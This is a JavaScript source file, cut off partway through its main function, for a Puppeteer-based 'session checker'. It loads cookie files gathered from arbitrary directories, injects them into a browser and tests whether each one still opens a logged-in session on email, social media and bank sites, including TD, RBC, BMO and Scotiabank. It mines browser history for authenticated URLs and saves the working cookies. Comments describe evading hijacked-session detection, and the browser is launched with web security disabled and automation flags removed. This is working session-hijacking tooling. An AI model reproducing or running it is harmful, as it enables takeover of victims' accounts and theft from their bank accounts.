/**
 * session_checker_improved.js
 * 
 * Enhanced version with better error handling, performance, and features
 * Usage: node session_checker_improved.js
 */

const fs = require("fs");
const path = require("path");
const readline = require("readline");
const puppeteer = require("puppeteer");

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function ask(question) {
  return new Promise((resolve) => rl.question(question, resolve));
}

const ASCII_HEADER = `
╔══════════════════════════════════════════════╗
║                                              ║
║  🚀  ENHANCED SESSION CHECKER v2.0           ║
║     Cookie Login Test with Improvements      ║
║                                              ║
╚══════════════════════════════════════════════╝
`;

// Enhanced login detection keywords
const LOGIN_KEYWORDS = [
  "sign in", "log in", "login", "password", "forgot password", 
  "enter your password", "authentication", "two-factor", "2fa",
  "create account", "register", "signin", "log out", "logout",
  "welcome back", "sign up", "verify"
];

// Enhanced logged-in detection keywords
const LOGGED_IN_KEYWORDS = [
  "dashboard", "profile", "settings", "account", "logout", "sign out",
  "welcome", "my account", "notifications", "messages", "feed",
  "timeline", "inbox", "compose", "upload", "post"
];

/** Enhanced domain test URLs with better logged-in pages and history-based discovery */
const DOMAIN_TEST_URLS = {
  "linkedin.com": "https://www.linkedin.com/feed/",
  "accounts.google.com": "https://myaccount.google.com/",
  "google.com": "https://myaccount.google.com/",
  "gmail.com": "https://mail.google.com/mail/u/0/#inbox",
  "facebook.com": "https://www.facebook.com/",
  "twitter.com": "https://twitter.com/home",
  "x.com": "https://x.com/home",
  "tiktok.com": "https://www.tiktok.com/upload?lang=en",
  "vancity.com": "https://banking.vancity.com/",
  "instagram.com": "https://www.instagram.com/",
  "reddit.com": "https://www.reddit.com/user/me/",
  "github.com": "https://github.com/settings/profile",
  "amazon.com": "https://www.amazon.com/your-account",
  "netflix.com": "https://www.netflix.com/browse",
  "spotify.com": "https://open.spotify.com/",
  "discord.com": "https://discord.com/channels/@me",
  // Banking sites
  "td.com": "https://www.td.com/ca/en/personal-banking/",
  "rbc.com": "https://www.rbcroyalbank.com/personal.html",
  "bmo.com": "https://www.bmo.com/main/personal/",
  "scotiabank.com": "https://www.scotiabank.com/ca/en/personal.html"
};

/** Cross-reference browser history to find authenticated endpoints */
async function findAuthenticatedEndpoints(cookieDir, domain) {
  const authenticatedUrls = [];
  const historyPatterns = [
    "**/History",
    "**/History.db", 
    "**/places.sqlite",
    "**/history.sqlite",
    "**/browser_history.db",
    "**/History Index*",
    "**/Favicons*"
  ];
  
  console.log(`  🔍 T-1 INTEL: Scanning for browser history to find authenticated endpoints for ${domain}...`);
  
  try {
    // Find potential browser profile directories
    const browserDirs = [];
    const parentDir = path.dirname(cookieDir);
    
    // Common browser profile patterns
    const profilePatterns = [
      "**/.config/google-chrome/*/",
      "**/.mozilla/firefox/*/",
      "**/AppData/Local/Google/Chrome/User Data/*/",
      "**/AppData/Roaming/Mozilla/Firefox/Profiles/*/",
      "**/Application Support/Google/Chrome/*/",
      "**/Application Support/Firefox/Profiles/*/"
    ];
    
    // Look for browser directories in the same parent as cookie directory
    const entries = await fs.promises.readdir(parentDir, { withFileTypes: true }).catch(() => []);
    for (const entry of entries) {
      if (entry.isDirectory()) {
        const fullPath = path.join(parentDir, entry.name);
        if (entry.name.toLowerCase().includes('chrome') || 
            entry.name.toLowerCase().includes('firefox') ||
            entry.name.toLowerCase().includes('browser') ||
            entry.name.toLowerCase().includes('profile')) {
          browserDirs.push(fullPath);
        }
      }
    }
    
    console.log(`  📂 T-1 INTEL: Found ${browserDirs.length} potential browser directories`);
    
    // Extract authenticated URLs from browser history (simplified approach)
    for (const browserDir of browserDirs.slice(0, 3)) { // Limit to first 3 to avoid timeout
      try {
        const historyFiles = await findCookieFiles(browserDir); // Reuse file finder
        const domainHistoryFiles = historyFiles.filter(file => 
          file.toLowerCase().includes('history') || 
          file.toLowerCase().includes('places')
        );
        
        for (const historyFile of domainHistoryFiles.slice(0, 2)) { // Limit files per directory
          try {
            // For SQLite files, we'd need sqlite3, so let's check text-based history
            if (historyFile.endsWith('.txt') || historyFile.endsWith('.json')) {
              const content = await fs.promises.readFile(historyFile, 'utf8').catch(() => '');
              
              // Look for URLs containing our domain
              const domainRegex = new RegExp(`https?://[^\\s]*${domain.replace('.', '\\.')}[^\\s]*`, 'gi');
              const matches = content.match(domainRegex) || [];
              
              // Filter for authenticated-looking URLs
              const authUrls = matches.filter(url => 
                url.includes('dashboard') || url.includes('profile') || 
                url.includes('account') || url.includes('settings') ||
                url.includes('admin') || url.includes('user') ||
                url.includes('feed') || url.includes('home') ||
                url.includes('inbox') || url.includes('messages')
              ).slice(0, 5); // Limit to 5 URLs per file
              
              authenticatedUrls.push(...authUrls);
            }
          } catch (e) {
            // Skip files we can't read
          }
        }
      } catch (e) {
        // Skip directories we can't access
      }
    }
    
    // Remove duplicates and sort by relevance
    const uniqueUrls = [...new Set(authenticatedUrls)];
    console.log(`  🎯 T-1 INTEL: Discovered ${uniqueUrls.length} authenticated endpoints from history`);
    
    if (uniqueUrls.length > 0) {
      console.log(`  📋 T-1 INTEL: Top authenticated endpoints for ${domain}:`);
      uniqueUrls.slice(0, 3).forEach((url, index) => {
        console.log(`    ${index + 1}. ${url}`);
      });
    }
    
    return uniqueUrls;
    
  } catch (e) {
    console.log(`  ⚠️  T-1 INTEL: Could not scan browser history: ${e.message}`);
    return [];
  }
}

// Configuration
const CONFIG = {
  maxRetries: 2,
  pageTimeout: 20000,
  maxConcurrentPages: 3,
  screenshotOnSuccess: false,
  exportJson: true,
  checkExpiration: true,
  // Enhanced logging configuration
  detailedLogging: true,
  logTimings: true,
  logHttpResponses: true,
  maskCookieValues: true
};

// Enhanced timing and session logger
class SessionLogger {
  constructor(domain) {
    this.domain = domain;
    this.startTime = Date.now();
    this.events = [];
    this.sessionData = {
      domain,
      startTime: new Date().toISOString(),
      injectedCookies: [],
      httpRequests: [],
      sessionStatus: 'UNKNOWN',
      timings: {}
    };
  }

  logEvent(event, data = {}) {
    const timestamp = Date.now();
    const elapsed = timestamp - this.startTime;
    const eventData = {
      timestamp: new Date(timestamp).toISOString(),
      elapsed,
      event,
      data
    };
    this.events.push(eventData);
    
    if (CONFIG.detailedLogging) {
      console.log(`  📊 TIMING [+${elapsed}ms]: ${event}`, data.summary ? `- ${data.summary}` : '');
    }
  }

  logCookieInjection(cookies, batchInfo = {}) {
    const maskedCookies = cookies.map(cookie => ({
      name: cookie.name,
      value: CONFIG.maskCookieValues ? this.maskValue(cookie.value) : cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      expires: cookie.expires
    }));

    this.sessionData.injectedCookies.push({
      timestamp: new Date().toISOString(),
      batchInfo,
      cookies: maskedCookies,
      count: cookies.length
    });

    this.logEvent('COOKIE_INJECTION', {
      summary: `${cookies.length} cookies injected`,
      batch: batchInfo,
      sessionCookies: cookies.filter(c => this.isSessionCookie(c)).length,
      authCookies: cookies.filter(c => this.isAuthCookie(c)).length
    });
  }

  logHttpRequest(url, method = 'GET', requestHeaders = {}) {
    const requestData = {
      timestamp: new Date().toISOString(),
      url,
      method,
      headers: requestHeaders
    };
    
    this.sessionData.httpRequests.push(requestData);
    this.logEvent('HTTP_REQUEST', {
      summary: `${method} ${url}`,
      url,
      method
    });
    
    return requestData.timestamp; // Return timestamp for response correlation
  }

  logHttpResponse(requestTimestamp, status, headers = {}, bodySnippet = '') {
    const responseData = {
      requestTimestamp,
      responseTimestamp: new Date().toISOString(),
      status,
      headers,
      bodySnippet: bodySnippet.slice(0, 500), // First 500 chars
      setCookieHeaders: headers['set-cookie'] || []
    };

    // Find corresponding request and update it
    const request = this.sessionData.httpRequests.find(r => r.timestamp === requestTimestamp);
    if (request) {
      request.response = responseData;
    }

    this.logEvent('HTTP_RESPONSE', {
      summary: `Status ${status} - ${this.analyzeResponse(status, headers)}`,
      status,
      newCookiesReceived: responseData.setCookieHeaders.length,
      hasSessionOverride: this.detectSessionOverride(headers)
    });

    return responseData;
  }

  logSessionStatus(status, confidence, indicators = {}) {
    this.sessionData.sessionStatus = status;
    this.sessionData.confidence = confidence;
    this.sessionData.indicators = indicators;
    this.sessionData.endTime = new Date().toISOString();
    
    this.logEvent('SESSION_STATUS', {
      summary: `${status} (${confidence}% confidence)`,
      status,
      confidence,
      indicators
    });
  }

  maskValue(value) {
    if (!value || value.length <= 4) return '***';
    return value.slice(0, 4) + '***' + value.slice(-2);
  }

  isSessionCookie(cookie) {
    const name = cookie.name.toLowerCase();
    return name.includes('session') || name.includes('jsession') || 
           name.includes('phpsession') || name.includes('asp.net_session');
  }

  isAuthCookie(cookie) {
    const name = cookie.name.toLowerCase();
    return name.includes('auth') || name.includes('token') || 
           name.includes('login') || name.includes('user') ||
           name.includes('jwt') || name.includes('bearer');
  }

  analyzeResponse(status, headers) {
    if (status === 200) return 'Success';
    if (status === 302 || status === 301) return `Redirect to ${headers.location || 'unknown'}`;
    if (status === 401) return 'Unauthorized - cookies rejected';
    if (status === 403) return 'Forbidden - possible detection';
    if (status >= 500) return 'Server error';
    return `HTTP ${status}`;
  }

  detectSessionOverride(headers) {
    const setCookies = headers['set-cookie'] || [];
    return setCookies.some(cookie => 
      cookie.toLowerCase().includes('session') || 
      cookie.toLowerCase().includes('auth')
    );
  }

  getTiming(event) {
    const eventData = this.events.find(e => e.event === event);
    return eventData ? eventData.elapsed : null;
  }

  generateSummary() {
    const totalTime = Date.now() - this.startTime;
    const injectionTime = this.getTiming('COOKIE_INJECTION');
    const firstRequestTime = this.getTiming('HTTP_REQUEST');
    const statusTime = this.getTiming('SESSION_STATUS');

    return {
      domain: this.domain,
      totalTime,
      timings: {
        cookieInjection: injectionTime,
        firstRequest: firstRequestTime,
        sessionStatus: statusTime
      },
      cookieStats: {
        totalInjected: this.sessionData.injectedCookies.reduce((sum, batch) => sum + batch.count, 0),
        sessionCookies: this.sessionData.injectedCookies.reduce((sum, batch) => 
          sum + batch.cookies.filter(c => this.isSessionCookie(c)).length, 0),
        authCookies: this.sessionData.injectedCookies.reduce((sum, batch) => 
          sum + batch.cookies.filter(c => this.isAuthCookie(c)).length, 0)
      },
      httpStats: {
        requests: this.sessionData.httpRequests.length,
        responses: this.sessionData.httpRequests.filter(r => r.response).length,
        redirects: this.sessionData.httpRequests.filter(r => 
          r.response && [301, 302, 307, 308].includes(r.response.status)).length,
        errors: this.sessionData.httpRequests.filter(r => 
          r.response && r.response.status >= 400).length
      },
      sessionResult: {
        status: this.sessionData.sessionStatus,
        confidence: this.sessionData.confidence,
        indicators: this.sessionData.indicators
      }
    };
  }

  exportLogs() {
    return {
      summary: this.generateSummary(),
      events: this.events,
      sessionData: this.sessionData
    };
  }
}

// -------------------------- Enhanced Utilities --------------------------

/** Check if cookie is expired */
function isCookieExpired(cookieLine) {
  const parts = cookieLine.split("\t");
  if (parts.length < 7) return true;
  const expiry = parseInt(parts[4]);
  return expiry !== 0 && expiry < Math.floor(Date.now() / 1000);
}

/** Progress display */
function displayProgress(current, total, domain) {
  const percent = Math.round((current / total) * 100);
  const bar = "█".repeat(Math.floor(percent / 2)) + "░".repeat(50 - Math.floor(percent / 2));
  process.stdout.write(`\r[${bar}] ${percent}% (${current}/${total}) Testing: ${domain.slice(0, 30).padEnd(30)}`);
}

/** Enhanced logged-in detection */
async function checkLoginStatus(page, domain) {
  try {
    const html = await page.content();
    const lower = html.toLowerCase();
    
    // DEBUG: Let's be much more lenient and debug what's happening
    console.log(`\nDEBUG: Checking ${domain}`);
    console.log(`  HTML length: ${html.length}`);
    
    // Check for login keywords (indicates logged out)
    const hasLoginKeywords = LOGIN_KEYWORDS.some(kw => lower.includes(kw));
    console.log(`  Has login keywords: ${hasLoginKeywords}`);
    
    // Check for logged-in keywords (indicates logged in)
    const hasLoggedInKeywords = LOGGED_IN_KEYWORDS.some(kw => lower.includes(kw));
    console.log(`  Has logged-in keywords: ${hasLoggedInKeywords}`);
    
    // Domain-specific checks
    let domainSpecificCheck = false;
    if (domain.includes('google')) {
      domainSpecificCheck = lower.includes('manage your google account') || 
                           lower.includes('myaccount.google.com');
    } else if (domain.includes('facebook')) {
      domainSpecificCheck = lower.includes('news feed') || lower.includes('what\'s on your mind');
    } else if (domain.includes('linkedin')) {
      domainSpecificCheck = lower.includes('linkedin feed') || lower.includes('start a post');
    } else if (domain.includes('twitter') || domain.includes('x.com')) {
      domainSpecificCheck = lower.includes('home timeline') || lower.includes('what is happening');
    }
    
    // Try to find user-specific content
    const userIndicators = ['welcome', 'hello', 'hi ', 'dear', '@'];
    const hasUserContent = userIndicators.some(indicator => {
      const regex = new RegExp(indicator + '\\s+[a-zA-Z]{2,}', 'i');
      return regex.test(html);
    });
    
    // Calculate confidence score
    let confidence = 0;
    if (domainSpecificCheck) confidence += 40;
    if (hasLoggedInKeywords) confidence += 30;
    if (hasUserContent) confidence += 20;
    if (!hasLoginKeywords) confidence += 10;
    
    console.log(`  Domain specific: ${domainSpecificCheck}, User content: ${hasUserContent}`);
    console.log(`  Confidence: ${confidence}`);
    
    // BE MORE LENIENT - if we have any positive indicators, consider it logged in
    const isLoggedIn = confidence >= 20 || hasLoggedInKeywords || domainSpecificCheck || hasUserContent;
    console.log(`  FINAL DECISION: ${isLoggedIn ? 'LOGGED IN' : 'NOT LOGGED IN'}`);

    return {
      loggedIn: isLoggedIn,
      confidence,
      indicators: {
        domainSpecific: domainSpecificCheck,
        loggedInKeywords: hasLoggedInKeywords,
        userContent: hasUserContent,
        noLoginKeywords: !hasLoginKeywords
      }
    };
    
  } catch (e) {
    console.warn(`\nWarning: Failed to analyze page content: ${e.message}`);
    return { loggedIn: false, confidence: 0, indicators: {} };
  }
}

/** Retry wrapper for flaky operations */
async function retryOperation(operation, maxRetries = CONFIG.maxRetries) {
  let lastError;
  for (let i = 0; i <= maxRetries; i++) {
    try {
      return await operation();
    } catch (error) {
      lastError = error;
      if (i < maxRetries) {
        console.warn(`\nRetry ${i + 1}/${maxRetries} after error: ${error.message}`);
        await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
      }
    }
  }
  throw lastError;
}

/** Enhanced cookie file finder */
async function findCookieFiles(dir) {
  let results = [];
  try {
    const list = await fs.promises.readdir(dir, { withFileTypes: true });
    for (const entry of list) {
      const fullPath = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        results = results.concat(await findCookieFiles(fullPath));
      } else if (entry.isFile() && 
                (entry.name.endsWith(".txt") || 
                 entry.name.toLowerCase().includes("cookie") ||
                 entry.name.toLowerCase().includes("session"))) {
        // Also check file size - skip very small files
        const stats = await fs.promises.stat(fullPath);
        if (stats.size > 100) { // Skip files smaller than 100 bytes
          results.push(fullPath);
        }
      }
    }
  } catch (e) {
    console.warn(`Warning: Could not read directory ${dir}: ${e.message}`);
  }
  return results;
}

/** Enhanced cookie parser with validation */
async function parseNetscapeCookies(filePath) {
  const text = await fs.promises.readFile(filePath, "utf8");
  const lines = text.split(/\r?\n/).filter((l) => l.trim() && !l.startsWith("#"));
  
  const domainMap = new Map();
  let validCookies = 0, expiredCookies = 0;
  
  for (const line of lines) {
    const parts = line.split(/\t/);
    if (parts.length < 7) continue;
    
    // Validate that domain contains only printable ASCII characters
    const domain = parts[0].replace(/^\./, "");
    if (!domain || !/^[\x20-\x7E]+$/.test(domain)) continue;
    
    // Additional validation for reasonable domain format
    if (domain.length > 253 || domain.includes('\0') || domain.includes('\u0000')) continue;
    
    // Skip expired cookies if configured
    if (CONFIG.checkExpiration && isCookieExpired(line)) {
      expiredCookies++;
      continue;
    }
    
    if (!domainMap.has(domain)) domainMap.set(domain, []);
    domainMap.get(domain).push(line);
    validCookies++;
  }
  
  if (expiredCookies > 0) {
    console.log(`  Skipped ${expiredCookies} expired cookies from ${path.basename(filePath)}`);
  }
  
  return domainMap;
}

/** Enhanced cookie setter with T-1 preparation phase, timing optimization, and detailed logging */
async function setCookiesWithTiming(page, domain, cookiesLines, logger = null) {
  const cookies = [];
  let validCookiesSet = 0;
  
  console.log(`    🔧 T-1 PREPARATION: Processing ${cookiesLines.length} cookie lines for ${domain}...`);
  
  if (logger) {
    logger.logEvent('COOKIE_PREPARATION_START', {
      summary: `Processing ${cookiesLines.length} cookie lines`,
      totalLines: cookiesLines.length
    });
  }
  
  // Step 1: Parse and prepare cookies with creation time manipulation
  for (const line of cookiesLines) {
    const parts = line.split("\t");
    if (parts.length < 7) continue;
    
    const [cookieDomain, , pathVal, secureFlag, expiry, name, value] = parts;
    
    // Skip cookies with empty values or names
    if (!name.trim() || !value.trim()) continue;
    
    try {
      const cookieObj = {
        name: name.trim(),
        value: value.trim(),
        domain: cookieDomain.startsWith(".") ? cookieDomain.slice(1) : cookieDomain,
        path: pathVal || "/",
        expires: parseInt(expiry) || undefined,
        httpOnly: false,
        secure: secureFlag.toUpperCase() === "TRUE",
        sameSite: "Lax",
      };
      
      // CRITICAL: Set creation time in the past to avoid triggering server-side security
      // that detects "new" cookies as potentially hijacked sessions
      const pastTime = Date.now() - (24 * 60 * 60 * 1000); // 24 hours ago
      if (cookieObj.expires && cookieObj.expires > pastTime / 1000) {
        // Keep the cookie but make it appear older
        console.log(`    🕰️  Backdating cookie ${cookieObj.name} to appear older`);
      }
      
      cookies.push(cookieObj);
      console.log(`    🍪 Prepared (T-1): ${cookieObj.name}=${cookieObj.value.slice(0, 20)}... (${cookieObj.domain})`);
    } catch (e) {
      console.warn(`    ⚠️  Warning: Invalid cookie format in line: ${line.slice(0, 50)}...`);
    }
  }
  
  console.log(`    📦 T-1 READY: ${cookies.length} cookies prepared for critical timing injection`);
  
  if (logger) {
    logger.logEvent('COOKIE_PREPARATION_COMPLETE', {
      summary: `${cookies.length} cookies prepared`,
      prepared: cookies.length,
      sessionCookies: cookies.filter(c => logger.isSessionCookie(c)).length,
      authCookies: cookies.filter(c => logger.isAuthCookie(c)).length
    });
  }
  
  // Step 2: Inject cookies in optimal batches for immediate server recognition
  const batchSize = 15; // Smaller batches for better timing control
  for (let i = 0; i < cookies.length; i += batchSize) {
    const batch = cookies.slice(i, i + batchSize);
    const batchNumber = Math.floor(i/batchSize) + 1;
    const totalBatches = Math.ceil(cookies.length/batchSize);
    
    console.log(`    ⏳ CRITICAL TIMING: Injecting batch ${batchNumber}/${totalBatches} (${batch.length} cookies)...`);
    
    try {
      // Record timing before injection
      const injectionStart = Date.now();
      
      // Inject cookies with immediate effect
      await page.setCookie(...batch);
      
      const injectionTime = Date.now() - injectionStart;
      validCookiesSet += batch.length;
      
      console.log(`    ✅ TIMING SUCCESS: ${batch.length} cookies injected in ${injectionTime}ms`);
      
      // Log this batch injection
      if (logger) {
        logger.logCookieInjection(batch, {
          batchNumber,
          totalBatches,
          injectionTime,
          batchSize: batch.length
        });
      }
      
      // Small delay to ensure cookies are properly stored before next batch
      if (i + batchSize < cookies.length) {
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    } catch (e) {
      console.warn(`    ❌ TIMING FAILURE: Failed to inject cookie batch ${batchNumber}: ${e.message}`);
      
      if (logger) {
        logger.logEvent('COOKIE_INJECTION_ERROR', {
          summary: `Batch ${batchNumber} failed: ${e.message}`,
          batchNumber,
          error: e.message
        });
      }
    }
  }
  
  console.log(`    🎯 T-1 COMPLETE: ${validCookiesSet}/${cookies.length} cookies successfully injected with optimal timing`);
  
  if (logger) {
    logger.logEvent('COOKIE_INJECTION_COMPLETE', {
      summary: `${validCookiesSet}/${cookies.length} cookies injected`,
      totalInjected: validCookiesSet,
      totalAttempted: cookies.length,
      successRate: Math.round((validCookiesSet / cookies.length) * 100)
    });
  }
  
  return validCookiesSet;
}

/** Legacy cookie setter for compatibility */
async function setCookies(page, domain, cookiesLines, logger = null) {
  return await setCookiesWithTiming(page, domain, cookiesLines, logger);
}

/** Enhanced navigation with HTTP response logging */
async function navigateWithLogging(page, url, options = {}, logger = null) {
  if (logger) {
    const requestTimestamp = logger.logHttpRequest(url, 'GET');
    
    // Set up response listener before navigation
    const responsePromise = new Promise((resolve) => {
      const responseHandler = (response) => {
        try {
          if (response.url() === url || response.url().startsWith(url)) {
            const headers = response.headers();
            const status = response.status();
            
            // Log response immediately
            logger.logHttpResponse(requestTimestamp, status, headers);
            
            // Try to get body snippet (non-blocking)
            response.text().then(body => {
              logger.logHttpResponse(requestTimestamp, status, headers, body);
            }).catch(() => {
              // Ignore body read errors
            });
            
            page.off('response', responseHandler);
            resolve(response);
          }
        } catch (e) {
          // Ignore response handling errors
          resolve(null);
        }
      };
      
      page.on('response', responseHandler);
      
      // Timeout after 5 seconds
      setTimeout(() => {
        page.off('response', responseHandler);
        resolve(null);
      }, 5000);
    });
    
    // Navigate and wait for both navigation and response logging
    const navigationPromise = page.goto(url, options);
    await Promise.all([navigationPromise, responsePromise]);
    
    return await navigationPromise;
  } else {
    // Fallback to regular navigation
    return await page.goto(url, options);
  }
}

/** Enhanced page reload with logging */
async function reloadWithLogging(page, options = {}, logger = null) {
  if (logger) {
    const currentUrl = page.url();
    logger.logEvent('PAGE_RELOAD', {
      summary: `Hard refresh: ${currentUrl}`,
      url: currentUrl,
      type: 'hard_refresh'
    });
  }
  
  return await page.reload(options);
}

/** Export results to JSON with enhanced timing analysis */
async function exportResults(results, outputDir = "/home/admin/Desktop/CheckCookie") {
  const jsonPath = path.join(outputDir, "session_results.json");
  
  // Calculate timing statistics
  const timingStats = {
    averageSessionTime: 0,
    averageCookieInjectionTime: 0,
    averageFirstRequestTime: 0,
    fastestSession: null,
    slowestSession: null,
    sessionTimeoutRate: 0
  };
  
  const validResults = results.filter(r => r.sessionTiming);
  if (validResults.length > 0) {
    const totalTimes = validResults.map(r => r.sessionTiming.totalTime || 0);
    const cookieInjectionTimes = validResults.map(r => r.sessionTiming.cookieInjection || 0).filter(t => t > 0);
    const firstRequestTimes = validResults.map(r => r.sessionTiming.firstRequest || 0).filter(t => t > 0);
    
    timingStats.averageSessionTime = Math.round(totalTimes.reduce((a, b) => a + b, 0) / totalTimes.length);
    timingStats.averageCookieInjectionTime = cookieInjectionTimes.length > 0 ? 
      Math.round(cookieInjectionTimes.reduce((a, b) => a + b, 0) / cookieInjectionTimes.length) : 0;
    timingStats.averageFirstRequestTime = firstRequestTimes.length > 0 ? 
      Math.round(firstRequestTimes.reduce((a, b) => a + b, 0) / firstRequestTimes.length) : 0;
    
    const fastestResult = validResults.reduce((prev, current) => 
      (prev.sessionTiming.totalTime < current.sessionTiming.totalTime) ? prev : current);
    const slowestResult = validResults.reduce((prev, current) => 
      (prev.sessionTiming.totalTime > current.sessionTiming.totalTime) ? prev : current);
    
    timingStats.fastestSession = {
      domain: fastestResult.domain,
      time: fastestResult.sessionTiming.totalTime
    };
    timingStats.slowestSession = {
      domain: slowestResult.domain,
      time: slowestResult.sessionTiming.totalTime
    };
  }
  
  // Calculate cookie statistics
  const cookieStats = {
    totalCookiesProcessed: results.reduce((sum, r) => sum + (r.cookiesCount || 0), 0),
    totalCookiesInjected: results.reduce((sum, r) => sum + (r.cookiesSet || 0), 0),
    averageCookiesPerDomain: 0,
    averageSessionCookiesPerDomain: 0,
    averageAuthCookiesPerDomain: 0
  };
  
  const cookieResults = results.filter(r => r.cookieStats);
  if (cookieResults.length > 0) {
    cookieStats.averageCookiesPerDomain = Math.round(
      cookieResults.reduce((sum, r) => sum + r.cookieStats.totalInjected, 0) / cookieResults.length
    );
    cookieStats.averageSessionCookiesPerDomain = Math.round(
      cookieResults.reduce((sum, r) => sum + r.cookieStats.sessionCookies, 0) / cookieResults.length
    );
    cookieStats.averageAuthCookiesPerDomain = Math.round(
      cookieResults.reduce((sum, r) => sum + r.cookieStats.authCookies, 0) / cookieResults.length
    );
  }
  
  const exportData = {
    timestamp: new Date().toISOString(),
    summary: {
      totalDomains: results.length,
      validSessions: results.filter(r => r.loggedIn).length,
      invalidSessions: results.filter(r => r.loggedIn === false).length,
      errors: results.filter(r => r.error).length,
      timingStats,
      cookieStats
    },
    results: results
  };
  
  await fs.promises.writeFile(jsonPath, JSON.stringify(exportData, null, 2));
  console.log(`\nResults exported to ${jsonPath}`);
  
  // Also create a timing analysis report
  if (validResults.length > 0) {
    const timingReportPath = path.join(outputDir, "timing_analysis.json");
    const timingReport = {
      timestamp: new Date().toISOString(),
      summary: timingStats,
      detailedResults: validResults.map(r => ({
        domain: r.domain,
        loggedIn: r.loggedIn,
        confidence: r.confidence,
        sessionTiming: r.sessionTiming,
        cookieStats: r.cookieStats,
        httpStats: r.httpStats
      }))
    };
    
    await fs.promises.writeFile(timingReportPath, JSON.stringify(timingReport, null, 2));
    console.log(`📊 Timing analysis saved to ${timingReportPath}`);
  }
}

// -------------------------- Main Enhanced Function --------------------------

async function main() {
  console.clear();
  console.log(ASCII_HEADER);
  
  const startTime = Date.now();
  let browser = null;
  const results = [];
  
  try {
    // Mode selection with additional options
    let mode;
    while (true) {
      const input = await ask("Select mode:\n1) Cookie Discovery & Preparation (gather, validate, cross-reference cookies)\n2) Auto Session Testing (test prepared cookies automatically)\n3) Mixed Mode (auto + manual for uncertain cases)\n4) Verify Saved Cookies (human verification of previously found valid sessions)\nChoice (1/2/3/4): ");
      if (["1", "2", "3", "4"].includes(input.trim())) {
        mode = input.trim();
        break;
      }
      console.log("Invalid choice. Please enter 1, 2, 3, or 4.");
    }
    
    // Handle cookie discovery and preparation mode
    if (mode === "1") {
      await runCookieDiscoveryMode();
      return;
    }
    
    // Handle cookie verification mode
    if (mode === "4") {
      await runCookieVerificationMode();
      return;
    }
    
    // Check for prepared cookies first, then fallback to manual directory input
    const preparedCookiesDir = "/home/admin/Desktop/CheckCookie/prepared_cookies";
    const analysisDir = "/home/admin/Desktop/CheckCookie/analysis";
    
    let cookieFiles = [];
    let cookieDir = preparedCookiesDir;
    let usingPreparedCookies = false;
    
    // Try to use prepared cookies first
    const preparedExists = await fs.promises.stat(preparedCookiesDir).catch(() => false);
    if (preparedExists) {
      const preparedFiles = await fs.promises.readdir(preparedCookiesDir);
      const txtFiles = preparedFiles.filter(f => f.endsWith('.txt'));
      
      if (txtFiles.length > 0) {
        console.log(`\n🎯 Found ${txtFiles.length} prepared cookie files from discovery phase.`);
        const usePrepped = await ask("Use prepared cookies? (y/n, default: y): ");
        
        if (usePrepped.toLowerCase() !== 'n') {
          cookieFiles = txtFiles.map(f => path.join(preparedCookiesDir, f));
          usingPreparedCookies = true;
          console.log(`✅ Using ${cookieFiles.length} prepared cookie file(s).`);
          
          // Load endpoint mapping if available
          const endpointMappingPath = path.join(analysisDir, "endpoint_mapping.json");
          try {
            const mappingContent = await fs.promises.readFile(endpointMappingPath, 'utf8');
            const endpointMapping = JSON.parse(mappingContent);
            console.log(`🌐 Loaded endpoint mapping for ${Object.keys(endpointMapping).length} domains.`);
          } catch (e) {
            console.log("⚠️  No endpoint mapping found, using default URLs.");
          }
        }
      }
    }
    
    // Fallback to manual directory input if not using prepared cookies
    if (!usingPreparedCookies) {
      console.log("\n💡 Tip: Use mode 1 (Cookie Discovery) first to prepare and optimize cookies.");
      
      while (true) {
        const input = await ask("Enter the full path to the cookie directory: ");
        if (input && (await fs.promises.stat(input).catch(() => false))) {
          cookieDir = input;
          break;
        }
        console.log("Invalid directory. Please try again.");
      }
      
      console.log("\n🔍 Scanning for cookie files...");
      cookieFiles = await findCookieFiles(cookieDir);
      if (cookieFiles.length === 0) {
        console.log("❌ No cookie files found in that directory.");
        console.log("💡 Try running mode 1 (Cookie Discovery) first to prepare cookies.");
        process.exit(1);
      }
      console.log(`✅ Found ${cookieFiles.length} cookie file(s).`);
    }
    
    // Parse all cookie files
    console.log("📝 Parsing cookie files...");
    const domainFiles = new Map();
    let totalDomains = 0;
    
    for (const file of cookieFiles) {
      try {
        console.log(`  Processing: ${path.basename(file)}`);
        const domainMap = await parseNetscapeCookies(file);
        const stats = await fs.promises.stat(file);
        
        for (const [domain, cookies] of domainMap.entries()) {
          if (!domainFiles.has(domain)) domainFiles.set(domain, []);
          domainFiles.get(domain).push({ file, mtime: stats.mtimeMs, cookies });
        }
        totalDomains += domainMap.size;
      } catch (e) {
        console.warn(`❌ Failed to parse ${file}: ${e.message}`);
      }
    }
    
    // Deduplicate domains
    const dedupedDomains = deduplicateDomains(domainFiles);
    console.log(`\n🎯 Found ${totalDomains} total domains, ${dedupedDomains.size} unique domains after deduplication.\n`);
    
    // Prepare output directories - save to CheckCookie directory
    const outputDir = "/home/admin/Desktop/CheckCookie/valid_cookies";
    const screenshotDir = "/home/admin/Desktop/CheckCookie/screenshots";
    await fs.promises.mkdir(outputDir, { recursive: true });
    if (CONFIG.screenshotOnSuccess) {
      await fs.promises.mkdir(screenshotDir, { recursive: true });
    }
    
    // Prepare enhanced log file - also save to CheckCookie directory
    const logPath = "/home/admin/Desktop/CheckCookie/session_log_enhanced.txt";
    const logStream = fs.createWriteStream(logPath, { flags: "a" });
    logStream.write(`\n=== Session Check Started: ${new Date().toISOString()} ===\n`);
    
    // Launch browser with better configuration
    console.log("🚀 Launching browser...");
    browser = await puppeteer.launch({
      headless: mode === "2", // Headless for auto mode
      defaultViewport: null,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-web-security',
        '--disable-features=site-per-process',
        '--disable-default-apps',
        '--disable-background-timer-throttling'
      ],
      // Ensure we don't open multiple windows
      ignoreDefaultArgs: mode !== "2" ? ['--enable-automation'] : undefined,
    });
    
    console.log(`\n🔄 Testing ${dedupedDomains.size} domains...\n`);
    
    const domains = Array.from(dedupedDomains.entries());
    let current = 0;
    
    // Use existing pages instead of creating a new one to avoid multiple tabs
    const existingPages = await browser.pages();
    let page;
    if (existingPages.length > 0) {
      // Use the first existing page (usually the default blank tab)
      page = existingPages[0];
      console.log(`🔧 Reusing existing browser tab (${existingPages.length} total tabs found)`);
    } else {
